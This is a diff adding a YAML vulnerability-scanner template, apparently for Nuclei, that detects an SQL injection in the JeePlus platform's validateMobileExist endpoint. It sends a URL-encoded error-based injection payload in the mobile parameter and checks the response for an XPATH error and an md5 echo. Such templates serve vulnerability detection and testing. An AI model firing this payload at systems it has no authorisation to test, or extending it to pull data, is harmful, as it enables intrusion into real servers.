@@ -1,0 +1,29 @@
+id: jeeplus-validatemobileexist-sqli
+info:
+  name: JeePlus validateMobileExist SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    JeePlus快速开发平台 validateMobileExist endpoint is vulnerable to an SQL Injection attack.
+
+variables:
+  t1: "{{rand_int(1, 100000)}}"
+
+http:
+  - method: GET
+    path:
+      - "/a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{t1}}%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+      - type: regex
+        part: body
+        regex:
+          - "{{md5(t1)}}"
